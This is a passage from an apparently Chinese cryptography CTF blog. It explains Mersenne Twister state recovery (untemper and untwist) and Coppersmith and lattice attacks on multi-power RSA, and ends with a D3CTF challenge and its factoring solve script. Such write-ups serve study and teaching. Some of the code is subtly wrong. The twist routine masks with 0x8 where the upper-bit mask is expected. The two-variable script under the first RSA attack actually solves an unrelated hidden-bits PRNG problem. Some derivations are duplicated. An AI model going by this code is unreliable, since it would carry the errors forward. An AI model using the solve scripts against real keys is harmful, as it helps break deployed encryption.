class="number">32</span>)[::-<span class="number">1</span>])</span><br><span class="line">T = matrix(GF(<span class="number">2</span>), T)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">untemper</span>(<span class="params">leak</span>):</span><br><span class="line">    Z = matrix(GF(<span class="number">2</span>), ZZ(leak).digits(<span class="number">2</span>, padto=<span class="number">32</span>)[::-<span class="number">1</span>])</span><br><span class="line">    X = T.solve_left(Z)</span><br><span class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x, y: (ZZ(x) &lt;&lt; <span class="number">1</span>) + ZZ(y), <span class="built_in">list</span>(X[<span class="number">0</span>]))</span><br></pre></td></tr></table></figure>
<p>同样可以获得 <code>untemper</code>。</p>
<p>这种方式的好处是可以针对不同的梅森随机数参数。</p>
<h1 id="旋转破解">旋转破解</h1>
<p>我们考虑旋转算法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = <span class="number">397</span></span><br><span class="line">a = <span class="number">0x9908b0df</span></span><br><span class="line">b = <span class="number">0x9d2c5680</span></span><br><span class="line">c = <span class="number">0xefc60000</span></span><br><span class="line">kInitOperand = <span class="number">0x6c078965</span></span><br><span class="line">kMaxBits = <span class="number">0xffffffff</span></span><br><span class="line">kUpperBits = <span class="number">0x80000000</span></span><br><span class="line">kLowerBits = <span class="number">0x7fffffff</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">twist</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.n):</span><br><span class="line">        x = self._int32((self.register[i] &amp; <span class="number">0x8</span>) +</span><br><span class="line">                        (self.register[(i + <span class="number">1</span>) % self.n] &amp; self.kLowerBits))</span><br><span class="line">        self.register[i] = self.register[(i + self.m) % self.n] ^ (x &gt;&gt; <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> x &amp; <span class="number">1</span> != <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># 0b10011001000010001011000011011111 == 0x9908b0df</span></span><br><span class="line">            self.register[i] ^= <span class="number">0x9908b0df</span></span><br><span class="line">    self.index = <span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>发现新的 <code>newState[i]</code> 取决于旧的
<code>state[i],state[i+1],state[i+397]</code>。</p>
<p>其中，由于
<code>newState[i] = state[i+397] ^ (x &gt;&gt; 1)</code>，故
<code>newState[i]</code> 的最高位只与 <code>state[i+397]</code> 和
<code>0x9908b0df</code>。</p>
<p>由于旋转的时候是迭代进行的，故 <code>newState[623]</code> 与
<code>newState[396]</code>
有关系，显然我们可以确定它，故我们通过此可以还原出
<code>newState[396] ^ (x &gt;&gt; 1)</code>，<code>state[623]</code>
的最高位（即 <code>x</code> 的最高位）和 <code>x</code>
的最低位（会发生异或一定是 <code>x &amp; 1 != 0</code>）。</p>
<p>而同理，由于 <code>newState[396]</code> 是确定的，所以可以解得
<code>x &gt;&gt; 1</code> 的结果，故我们最终还原出了 <code>x</code>，即
<code>state[623]</code> 的最高位和 <code>newState[0]</code>
的剩余位。</p>
<p>通过这种办法迭代可得旋转前的 <code>state</code>。</p>
<p>可以写出代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">624</span></span><br><span class="line">m = <span class="number">397</span></span><br><span class="line">a = <span class="number">0x9908b0df</span></span><br><span class="line">b = <span class="number">0x9d2c5680</span></span><br><span class="line">c = <span class="number">0xefc60000</span></span><br><span class="line">kInitOperand = <span class="number">0x6c078965</span></span><br><span class="line">kMaxBits = <span class="number">0xffffffff</span></span><br><span class="line">kUpperBits = <span class="number">0x80000000</span></span><br><span class="line">kLowerBits = <span class="number">0x7fffffff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">untwist</span>(<span class="params">newState</span>):</span><br><span class="line">    oldState = [<span class="number">0</span>] * <span class="number">624</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>, -<span class="number">2</span>, -<span class="number">1</span>):</span><br><span class="line">        x = newState[i] ^ newState[(i + m) % n]</span><br><span class="line">        <span class="keyword">if</span> x &amp; kUpperBits == kUpperBits:</span><br><span class="line">            x ^= a</span><br><span class="line">            x &lt;&lt;= <span class="number">1</span></span><br><span class="line">            x |= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x &lt;&lt;= <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> i &gt; -<span class="number">1</span>:</span><br><span class="line">            oldState[i] |= x &amp; kUpperBits</span><br><span class="line">        <span class="keyword">if</span> i + <span class="number">1</span> &lt; n:</span><br><span class="line">            oldState[i + <span class="number">1</span>] |= x &amp; kLowerBits</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">227</span>:</span><br><span class="line">            newState = <span class="built_in">list</span>(newState[:<span class="number">227</span>]) + oldState[<span class="number">227</span>:]</span><br><span class="line">    <span class="keyword">return</span> oldState</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>crypto</tag>
        <tag>PRNG</tag>
      </tags>
  </entry>
  <entry>
    <title>multi-power-RSA 笔记</title>
    <url>//multi-power-rsa.html</url>
    <content><![CDATA[<h1 id="n-prq-attack-p-多次幂攻击"><span class="math inline">\(N =
p^rq\)</span> Attack (<span class="math inline">\(p\)</span>
多次幂攻击)</h1>
<h2 id="the-first-attack">The First Attack</h2>
<h3 id="lu-zhang-and-lin-theorem-线性模多项式方程定理">Lu, Zhang and Lin
theorem (线性模多项式方程定理)</h3>
<p>设 <span class="math inline">\(N\)</span> 整除 <span class="math inline">\(p^u\)</span>，使得 <span class="math inline">\(p\geq N^\beta\ (0&lt;\beta\leq 1)\)</span>，</p>
<p>设 <span class="math inline">\(f(x,y)\in\Z[x,y]\)</span>
为齐次线性多项式，</p>
<p>如果满足条件： <span class="math display">\[
\gamma1+\gamma2&lt;uv\beta^2
\]</span> 我们就可以在多项式时间内找到方程 <span class="math inline">\(f(x,y)=0\pmod{p^v}\)</span> 所有的解 <span class="math inline">\((x,y)\)</span>，其中 <span class="math inline">\(\gcd(x,y)=1,|x|&lt;N^{\gamma1},|y|&lt;N^{\gamma2}\)</span>。</p>
<h3 id="legendres-theorem-连分数定理">Legendre's theorem
(连分数定理)</h3>
<p>如果存在 <span class="math inline">\(\xi \in \Q^*\)</span>，<span class="math inline">\(a,b\in \Z\)</span> 且 <span class="math inline">\(\gcd(a,b)=1\)</span> 满足 <span class="math display">\[
\left|\xi-\frac{a}{b}\right|&lt;\frac{1}{2b^2}
\]</span> 那么 <span class="math inline">\(\displaystyle\frac{a}{b}\)</span> 就是 <span class="math inline">\(\xi\)</span> 的一个有理近似。</p>
<h3 id="原理">原理</h3>
<p>设 <span class="math inline">\(N=p^rq\)</span> 是 RSA
中的模数，且公钥 <span class="math inline">\(e\)</span> 满足方程 <span class="math inline">\(ex-\varphi(N)y=z\)</span>，如果 <span class="math display">\[
|xz|&lt;N^{\frac{r(r-1)}{(r+1)^2}}
\]</span> 那么我们可以在多项式时间内分解 <span class="math inline">\(N\)</span>。</p>
<p>证明忽略，最后得到结论 <span class="math display">\[
\gcd(ex-z,N)=\gcd(p^{r-1}(p-1)(q-1)y,p^rq)=g
\]</span> 可以确定 <span class="math inline">\(p\)</span>，因此将 <span class="math inline">\(N\)</span> 按如下情况分解：</p>
<ul>
<li>当 <span class="math inline">\(g=p^{r-1}\)</span> 时，<span class="math inline">\(p=g^{\frac{1}{r-1}}\)</span></li>
<li>当 <span class="math inline">\(g=p^r\)</span> 时，<span class="math inline">\(p=g^{\frac{1}{r}}\)</span></li>
<li>当 <span class="math inline">\(g=p^{r-1}q\)</span> 时，<span class="math inline">\(p=\frac{N}{g}\)</span></li>
</ul>
<p>因此我们分解了 <span class="math inline">\(N\)</span>。</p>
<p>在算法中我们转换方程为 <span class="math inline">\(ex-z\equiv0\pmod{p^{r-1}}\)</span>，使用
<strong>Coppersmith's technique</strong>，选择参数 <span class="math inline">\(m=7,t=6\)</span> 构造维度为 36 的格，并且选择
<span class="math display">\[
X=\left[N^{\frac{r(r-1)}{(r+1)^2}}\right]
\]</span> 我们使用多项式 <span class="math inline">\(f(x1,x2)=x1+ex2\)</span> 构造格，应用 LLL
算法寻找到小根 <span class="math inline">\((x_1,x_2)\)</span> 满足 <span class="math inline">\(f(x_1,x_2)\equiv0\pmod{p^{r-1}}\)</span>。</p>
<p>这样我们就可以计算出 <span class="math display">\[
g=\gcd(x_1+ex_2,N)
\]</span></p>
<h3 id="脚本">脚本</h3>
<p>当方程 <span class="math inline">\(ex-z\equiv0\)</span>
的解已知一个时，我们仅需一元 Copper 即可求解：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">N=<span class="number">539779851369541956878655738599584730199799866957191805784596190682932284216781781433367450841202917758999300635019369629627621029957135109806205877317954671312041249493462048283611940752235036153024920172209763260723728345918562258401803973624430150143563078517485996070862532682695228590709019451174548520135142052216785774589096706631010293690859363524584240662502290912412366366114571976050857239915691266377257797199583543940504695517331512813468837128344612227973709974625418257243011036826241599265375741977853552204640800449679679351666009764297016524814036295707311913711955324055690490892097177271718850857268982130811714517356073266905474635370690445031512184247179039751734276906533177939993769044135143389748416635981226449566039039202521305851567296884751935162651063209779647359922622084851547605090230221057349511482738300221222563908357379545905837110168948295030747460300104202323692732549831403834387939156877086852393515817984772384147449841124275061609701453997579569931391166586163299940486204581696722731952467570857217406030804590055255431828403195798003509083922294733709507134156466158642941338493323430671502043066148246348074878064089651235355282144209668143249348243220714471988019011613749340243917652821</span></span><br><span class="line">e=<span class="number">8179300978753084587812861894047395225516049110376948812109811319430275614612773726672345893359691900281432484382670047044697374818043512731533402576374645405477207239801498428774783768163880078495448747421425078521981578408638790336528372019271073712013371141939808017049399434858687299480461753638164719404612128939787055797762174745092074547412183349192156638711750872083313795551439465507724807626674514935170104573715458782366469587138508845980490673890245713729782917089910271980557159592807350504157192913530007199510144004848020221181558472160543018733124225266127379373751910439604459368078652499029070936707349862139053913745186413782066470461478961703013591655136140060879250067379283913798867648758171004535775565306842444545755351202796833177560656564652632975685912935281581268141803696686952259539945588609591385807620108279333498170028167338690235117003515264281843953984997958878272347778561933726792473981855755454522886321669676790813189668084373153897754540290867346751033567500922477317530445967753955221454744946208555394588111484610700789566547507402309549957740815535069057837915204852490930168843605732632328017129154852857227895362549146737618906180651623216848500491438142456250653458053922622240299736136335179639180898730269690699965799644757774472147210271111150769048976871249731156387939260749192370361488285775377622944817570292095201906142567403539151179209316853493906909989301225903409448461436855145</span></span><br><span class="line">b=<span class="number">17623328397444755087284107444487160871617682792372566887446834913712379373851213638071138745775127796589871734472781755930251379295485892067473329763997583502625804363418069062645997342172778252731889437</span></span><br><span class="line">r = <span class="number">7</span></span><br><span class="line">idx = (r*(r-<span class="number">1</span>)) / ((r+<span class="number">1</span>)*(r+<span class="number">1</span>))</span><br><span class="line">P.&lt;x&gt; = PolynomialRing(Zmod(N))</span><br><span class="line">f = e * x - b</span><br><span class="line">roots = f.monic().small_roots(beta=idx)</span><br><span class="line"><span class="built_in">print</span>(roots)</span><br></pre></td></tr></table></figure>
<p>当方程 <span class="math inline">\(ex-z\equiv0\)</span>
的两个解都未知时，我们需要使用二元 Copper 求解：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line"></span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line"></span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line"></span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;LLL done&quot;</span>)</span><br><span class="line"></span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line"></span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = <span class="number">68823589009570846705623113091430161477799561031575612135516351257937127579444</span></span><br><span class="line">b = <span class="number">76549169049080319489163980188997771079750670038002598167961495813084486794567</span></span><br><span class="line">c = <span class="number">99215492498952976642031024510129092308042391285395704888838178561670205468882</span></span><br><span class="line">p = <span class="number">12775129699668988473759438271274836254349225413222075887429387682336494103348583050672280757042383792640084197832605411237644937815012509935794275313643031</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x1 = <span class="number">664406108637237317109372377546194289077117372665932150107678757303243619963182733408311739663233548725195723884930183442927293177078507</span></span><br><span class="line">x2 = <span class="number">269639459994260392015105629865659210391196381140872041084737976688017858324308345528702533444116282512066085580909718347778743354754352</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HiddenBits = <span class="number">64</span></span><br><span class="line">bound = <span class="number">2</span>**HiddenBits - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">P = PolynomialRing(Zmod(p), names=(<span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>))</span><br><span class="line">(x, y) = P.gens()</span><br><span class="line"></span><br><span class="line">f = y + (x2 &lt;&lt; HiddenBits) - a * (x + (x1 &lt;&lt; HiddenBits))**<span class="number">2</span> - b * (x+(x1&lt;&lt;HiddenBits)) - c</span><br><span class="line">bounds = (bound, bound)</span><br><span class="line">roots = small_roots(f, bounds)</span><br><span class="line"><span class="built_in">print</span>(roots)</span><br></pre></td></tr></table></figure>
<h2 id="the-second-attack">The Second Attack</h2>
<h3 id="原理-1">原理</h3>
<p>设模数 <span class="math inline">\(N=p^rq\)</span>，私钥 <span class="math inline">\((d_1,d_2)\)</span>，如果 <span class="math display">\[
|d_1-d_2|&lt;N^{\frac{r(r-1)}{(r+1)^2}}
\]</span> 那么我们可以在多项式时间内对 <span class="math inline">\(N\)</span> 进行分解。</p>
<p>证明如下：</p>
<p>假设 <span class="math inline">\(e_1d_1-k_1\phi(N)=1\)</span> 、<span class="math inline">\(e_2d_2-k_2\phi(N)=1\)</span> 且 <span class="math inline">\(e_1&gt;e_2\)</span></p>
<p>因此 <span class="math inline">\(e_1d_1\equiv
1\pmod{\phi(N)}\)</span>，<span class="math inline">\(e_2d_2\equiv
1\pmod{\phi(N)}\)</span></p>
<p>前一个式子乘以 <span class="math inline">\(e_2\)</span>，后一个式子乘以 <span class="math inline">\(e_1\)</span>，相减得到 <span class="math display">\[
e_1e_2(d_1-d_2)\equiv e_2-e_1\pmod{\phi(N)}
\]</span> 因为 <span class="math inline">\(\phi(N)=p^{r-1}(p-1)(q-1)\)</span>，故 <span class="math inline">\(e_1e_2(d_1-d_2)\equiv
e_2-e_1\pmod{p^{r-1}}\)</span></p>
<p>现在，只需考虑以下这个线性方程 <span class="math display">\[
e_1e_2x-(e_2-e_1)\equiv 0\pmod{p^{r-1}}
\]</span> 其中 <span class="math inline">\(d_1-d_2\)</span>
是该方程的根。</p>
<p>进一步假设 <span class="math inline">\(|d_1-d_2|&lt;N^\delta\)</span>，运用<strong>定理一</strong>，其中
<span class="math inline">\(u=r,v=r-1\ 且\
\beta=\frac{1}{r+1}\)</span>，可以推导出如果 <span class="math inline">\(\delta&lt;uv\beta^2=\frac{r(r-1)}{(r+1)^2}\)</span>，那么
<span class="math inline">\(x=d_1-d_2\)</span>
可在多项式时间内求解。</p>
<p>也就是说如果 <span class="math inline">\(|d_1-d_2|&lt;N^{\frac{r(r-1)}{(r+1)^2}}\)</span>，可以在多项式时间内求解方程。</p>
<p>通过计算 <span class="math display">\[
\gcd(e_1e_2x-(e_2-e_1),N)=\gcd(p^{r-1}(p-1)(q-1)y,p^rq)=g
\]</span></p>
<p>证明忽略，最后得到结论 <span class="math display">\[
\gcd(e_1e_2x-(e_2-e_1),N)=\gcd(p^{r-1}(p-1)(q-1)y,p^rq)=g
\]</span> 可以确定 <span class="math inline">\(p\)</span>，因此将 <span class="math inline">\(N\)</span> 按如下情况分解：</p>
<ul>
<li>当 <span class="math inline">\(g=p^{r-1}\)</span> 时，<span class="math inline">\(p=g^{\frac{1}{r-1}}\)</span></li>
<li>当 <span class="math inline">\(g=p^r\)</span> 时，<span class="math inline">\(p=g^{\frac{1}{r}}\)</span></li>
<li>当 <span class="math inline">\(g=p^{r-1}q\)</span> 时，<span class="math inline">\(p=\frac{N}{g}\)</span></li>
</ul>
<p>因此我们分解了 <span class="math inline">\(N\)</span>。</p>
<h3 id="实例">实例</h3>
<p>尝试求解 <span class="math inline">\(N=p^2q\)</span>，其中 <span class="math display">\[
N = 6093253851486120878859471958399737725885946526553626219\\
e1 = 2749600381847487389715964767235618802529675855606377411\\
e2 = 3575081244952414009316396501512372226545892558898276551
\]</span> 构建方程 <span class="math inline">\(f(x)=e_1e_2x-(e_2-e_1)\equiv
0\pmod{p^{r-1}}\)</span> （我们可以将这个方程看作 <span class="math inline">\(g(x)=x-a\equiv 0\pmod{p^{r-1}}\)</span>，其中
<span class="math inline">\(a\equiv
(e_2-e_1)(e_1e_2)^{-1}\pmod{N}\)</span>）</p>
<p>使用 <span class="math inline">\(m=8\)</span> 和 <span class="math inline">\(t=6\)</span>，我们构建一个维度为 <span class="math inline">\(\omega=9\)</span> 的格。</p>
<p>应用 LLL 算法并接触第一个简化多项式，我们得到了解 <span class="math inline">\(x_0= 1826732340\)</span></p>
<p>因此 <span class="math inline">\(\gcd(f(x_0),N)=p=1789386140116417697\)</span>，且最终
<span class="math inline">\(q=\frac{N}{p^2}=1903010275819064491\)</span></p>
<p>整个求解程序的运行时间使用现成的计算机是少于 4 秒的。</p>
<p>最后我们可以恢复私钥 <span class="math inline">\((d_1,d_2)\)</span>。</p>
<p>但是要注意到，如果 <span class="math inline">\(d_1\approx d_2\approx
N^{0.99}\)</span>，且 Sarkar’s method 与存在范围 <span class="math inline">\(d&lt;N^{0.395}\)</span>，可能无法恢复私钥。</p>
<h3 id="脚本-1">脚本</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">r = <span class="number">7</span></span><br><span class="line">N = <span class="number">209798341155088334158217087474227805455138848036904381404809759100627849272231840321985747935471287990313456209656625928356468120896887536235496490078123448217785939608443507649096688546074968476040552137270080120417769906047001451239544719039212180059396791491281787790213953488743488306241516010351179070869410418232801398578982244984544906579574766534671056023774009163991804748763929626213884208260660722705479782932001102089367261720194650874553305179520889083170973755913964440175393646890791491057655226024046525748177999422035469428780228224800114202385209306803288475439775037067014297973202621118959024226798935588827359265962780792266516120013602384766460619793738405476219362508944225007365127768741191310079985425349292613888185378948854602285379329682053663283534930182589905986063348509703027498270111412063194971956202729807710253369312175636837558252924035002153389909587349043986253518050303628071319876207392440085675892353421232158925122721273720564784886530611286461575045181073744696415657043278123662980166364494583141297996445429477446442693717498789391918530672770193730629928408766563592081857706608049076318165712479742423149330311238462044666384622153280310696667586565906758451118241914402257039981388209</span></span><br><span class="line"></span><br><span class="line">e1 = <span class="number">167033559384298522723574512241709447697750495062051373339874928117760768631565225663704494711294488556402223152830158600944819657473430506318731286655519728589208977191031849602792050411662024383502548579402516538753112670329781366297260905517214408459895097308286783418547254449419676568096534767340832822470233461516097690657337287889405321592527860524201824371955082411119548743528220794151774190322092515459637969925138496615421690273925560390321721643556915400569894100488394008220811596560968566833296068500476868375996187754631888256419438775013308064639754700359028260289266420692324376220460340153811660590804281527733243177527178698523018103373311259548716062006020121615186595491453534952848570829485638553678760994354019044715078062414748269425818079274218450448217803229617020494546843594180682307375768323235309661628678546003718924902228908888185484412626429441196588985691713767554591991735686919964937441820738008046218954331990752603146125777571183543616375946363623251491371247594696767767918341279655251868517380267258878990871525012299220182939441091806206624720194246691865367941280852353547267930167542329486261552854451001546455904682702366584763940463481732752992487773878685793275652314513014646439770319249</span></span><br><span class="line">e2 = <span class="number">69076592619651589706691933313826601279528159013379300261609967352748175972662567592943146333144902972780621576811778115958019397062270814057821407036352529372113467206560849267275602453288227390740346959857322649956992529510338912182696854496200041245775322561359546062736323363354733510660780489558215103581313753430117471361013972291126160134685745917715386613876414886325025010348396410346222272648657374977901786530969589123771261040601627906959627351426881111464943086191212001374558078570830214670111422731410682212770683631011038163623234630601007231955235905528750031898751733232446644402069580930596404887288935724879795199659228145390574503341087565153744389617539607111733080406125228559950446336384154674927952991964565965760896308198785777527690939982523416579778957846249005801121682470447753074839399698315364445972142571727376297422736232659133510385808957304351692629177239808890209690661982628408419571131470406142532800330250274534615063537773403062635865734585850821677880659194795963303700015814615804751909674946908768425855361277478190640780518117596780808975720826484146074528564147729911624750510271539697935538038871993380673492022099183863825435237650082706168588306816635866830411481021066926833372846305</span></span><br><span class="line"></span><br><span class="line">x = polygen(Zmod(N))</span><br><span class="line">f = e1 * e2 * x - (e2 - e1)</span><br><span class="line">f = f.monic()</span><br><span class="line"></span><br><span class="line"><span class="comment"># epsilon=0.05</span></span><br><span class="line">roots = f.small_roots(beta=((r*(r-<span class="number">1</span>)) / ((r+<span class="number">1</span>)*(r+<span class="number">1</span>))))</span><br><span class="line"><span class="built_in">print</span>(roots)</span><br></pre></td></tr></table></figure>
<h3 id="题目">题目</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> msg</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;d3ctf&#123;&#x27;</span>+md5(msg).hexdigest()+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">p = getPrime(<span class="number">256</span>)</span><br><span class="line">q = getPrime(<span class="number">256</span>)</span><br><span class="line"><span class="keyword">assert</span> p &gt; q</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">m = bytes_to_long(msg)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line">N = <span class="built_in">pow</span>(p, <span class="number">7</span>) * q</span><br><span class="line">phi = <span class="built_in">pow</span>(p, <span class="number">6</span>) * (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d1 = getPrime(<span class="number">2000</span>)</span><br><span class="line">d2 = nextprime(d1 + getPrime(<span class="number">1000</span>))</span><br><span class="line">e1 = invert(d1, phi)</span><br><span class="line">e2 = invert(d2, phi)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;N = <span class="subst">&#123;N&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e1 = <span class="subst">&#123;e1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e2 = <span class="subst">&#123;e2&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c = 2420624631315473673388732074340410215657378096737020976722603529598864338532404224879219059105950005655100728361198499550862405660043591919681568611707967</span></span><br><span class="line"><span class="string">N = 1476751427633071977599571983301151063258376731102955975364111147037204614220376883752032253407881568290520059515340434632858734689439268479399482315506043425541162646523388437842149125178447800616137044219916586942207838674001004007237861470176454543718752182312318068466051713087927370670177514666860822341380494154077020472814706123209865769048722380888175401791873273850281384147394075054950169002165357490796510950852631287689747360436384163758289159710264469722036320819123313773301072777844457895388797742631541101152819089150281489897683508400098693808473542212963868834485233858128220055727804326451310080791</span></span><br><span class="line"><span class="string">e1 = 425735006018518321920113858371691046233291394270779139216531379266829453665704656868245884309574741300746121946724344532456337490492263690989727904837374279175606623404025598533405400677329916633307585813849635071097268989906426771864410852556381279117588496262787146588414873723983855041415476840445850171457530977221981125006107741100779529209163446405585696682186452013669643507275620439492021019544922913941472624874102604249376990616323884331293660116156782891935217575308895791623826306100692059131945495084654854521834016181452508329430102813663713333608459898915361745215871305547069325129687311358338082029</span></span><br><span class="line"><span class="string">e2 = 1004512650658647383814190582513307789549094672255033373245432814519573537648997991452158231923692387604945039180687417026069655569594454408690445879849410118502279459189421806132654131287284719070037134752526923855821229397612868419416851456578505341237256609343187666849045678291935806441844686439591365338539029504178066823886051731466788474438373839803448380498800384597878814991008672054436093542513518012957106825842251155935855375353004898840663429274565622024673235081082222394015174831078190299524112112571718817712276118850981261489528540025810396786605197437842655180663611669918785635193552649262904644919</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>exp 如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">r = <span class="number">7</span></span><br><span class="line"></span><br><span class="line">N = <span class="number">1476751427633071977599571983301151063258376731102955975364111147037204614220376883752032253407881568290520059515340434632858734689439268479399482315506043425541162646523388437842149125178447800616137044219916586942207838674001004007237861470176454543718752182312318068466051713087927370670177514666860822341380494154077020472814706123209865769048722380888175401791873273850281384147394075054950169002165357490796510950852631287689747360436384163758289159710264469722036320819123313773301072777844457895388797742631541101152819089150281489897683508400098693808473542212963868834485233858128220055727804326451310080791</span></span><br><span class="line"></span><br><span class="line">e1 = <span class="number">425735006018518321920113858371691046233291394270779139216531379266829453665704656868245884309574741300746121946724344532456337490492263690989727904837374279175606623404025598533405400677329916633307585813849635071097268989906426771864410852556381279117588496262787146588414873723983855041415476840445850171457530977221981125006107741100779529209163446405585696682186452013669643507275620439492021019544922913941472624874102604249376990616323884331293660116156782891935217575308895791623826306100692059131945495084654854521834016181452508329430102813663713333608459898915361745215871305547069325129687311358338082029</span></span><br><span class="line">e2 = <span class="number">1004512650658647383814190582513307789549094672255033373245432814519573537648997991452158231923692387604945039180687417026069655569594454408690445879849410118502279459189421806132654131287284719070037134752526923855821229397612868419416851456578505341237256609343187666849045678291935806441844686439591365338539029504178066823886051731466788474438373839803448380498800384597878814991008672054436093542513518012957106825842251155935855375353004898840663429274565622024673235081082222394015174831078190299524112112571718817712276118850981261489528540025810396786605197437842655180663611669918785635193552649262904644919</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">2420624631315473673388732074340410215657378096737020976722603529598864338532404224879219059105950005655100728361198499550862405660043591919681568611707967</span></span><br><span class="line"></span><br><span class="line">x = polygen(Zmod(N))</span><br><span class="line">f = e1 * e2 * x - (e2 - e1)</span><br><span class="line">f = f.monic()</span><br><span class="line"></span><br><span class="line">roots = f.small_roots(beta=((r - <span class="number">1</span>) / (r + <span class="number">1</span>) - <span class="number">0.01</span>), epsilon=<span class="number">0.05</span>)</span><br><span class="line"></span><br><span class="line">res = gmpy2.iroot(gmpy2.gcd(<span class="built_in">int</span>(f(roots[<span class="number">0</span>])), N), r - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">assert</span> res[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p =&quot;</span>, res[<span class="number">0</span>])</span><br><span class="line">p = res[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">q = N // (p**<span 